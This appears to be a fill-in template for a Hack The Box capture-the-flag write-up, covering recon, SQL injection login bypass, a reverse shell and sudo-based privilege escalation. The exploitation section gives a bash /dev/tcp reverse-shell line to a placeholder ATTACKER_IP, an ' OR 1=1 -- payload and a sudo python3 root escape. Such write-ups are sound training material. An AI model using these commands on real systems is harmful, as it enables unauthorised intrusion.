# Hack The Box - [Machine Name]

Difficulty:  
OS:  
IP:  

---

# 1. Reconnaissance

## Nmap scan

Command:

nmap -sC -sV -p- TARGET_IP

Result:

PORT     STATE SERVICE VERSION
22/tcp   open  ssh
80/tcp   open  http

Notes:

- SSH available
- Web server running on port 80

---

# 2. Enumeration

## Web enumeration

Visit website:

http://TARGET_IP

Findings:

- login panel
- possible credentials field

Directory brute force:

gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt

Discovered directories:

/admin
/login

---

## Service enumeration

Example:

ftp TARGET_IP

Notes:

- anonymous login allowed
- downloaded files from server

---

# 3. Exploitation

Vulnerability discovered:

Example: SQL Injection

Payload used:

' OR 1=1 --

Result:

- login bypass
- gained access to admin panel

Reverse shell:

Command:

nc -lvnp 4444

Payload executed:

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Shell obtained.

---

# 4. Privilege Escalation

Check sudo permissions:

sudo -l

Result:

User can run:

/usr/bin/python3 as root

Exploit:

sudo python3 -c 'import os; os.system("/bin/bash")'

Root shell obtained.

---

# 5. Flags

User flag:

cat /home/user/user.txt

Root flag:

cat /root/root.txt

---

# 6. Lessons Learned

Key points:

- importance of enumeration
- weak authentication
- privilege escalation via sudo misconfiguration

---

# Tools Used

- nmap
- gobuster
- netcat
- burp suite

---

# References

- exploit-db
- GTFOBins
